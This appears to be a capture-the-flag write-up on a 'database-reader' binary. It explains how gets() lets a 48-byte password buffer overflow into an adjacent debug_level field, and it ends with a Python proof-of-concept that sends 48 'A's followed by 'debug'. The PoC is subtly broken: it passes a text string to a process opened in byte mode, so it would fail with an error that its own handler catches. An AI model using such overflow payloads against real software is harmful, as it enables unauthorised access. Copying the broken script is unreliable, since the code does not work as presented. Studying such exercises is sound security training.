
# Vulnerability
------

This challenge happens on the `database-reader` binary file.


We see in the source code the `debug_level` variable is declared in a struct just after the `password` one. And the `password` variable has a hardcoded 48 bytes size:

```C
struct {
    char password[48];
    char debug_level[5];
  } locals = {
    .password = {0},
    .debug_level = "guest"
  };
```


Finally, we can see the condition to launch the `decode` function is triggered in 2 cases, and one of them is that the `debug_level` variable has to contain *"debug"*.

Furthermore, we see the `gets` function from the Standard C library is used to set the password to the `password` address. And this function does not check for overflow, which means we can freely **overflow** and the ***overwrite*** the `debug_level` variable by entering 48 characters, and then *"debug"*.


# PoC
------

```python
#!/usr/bin/env python3

import subprocess

binary_path = '/opt/intern/database-reader'
payload = 48 * 'A' + 'debug'

def exploit_overwrite():
    try:
        process = subprocess.Popen(
            [binary_path],
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            text = False
        )
        stdout, stderr = process.communicate(input=payload)
        print("Output of the program:")
        print(stdout.decode('latin-1'))

    except FileNotFoundError:
        print(f"Could not find {binary_path} binary file")
    except Exception as e:
        print(f"Error: {e}")



if __name__ == "__main__":
    exploit_overwrite()

```

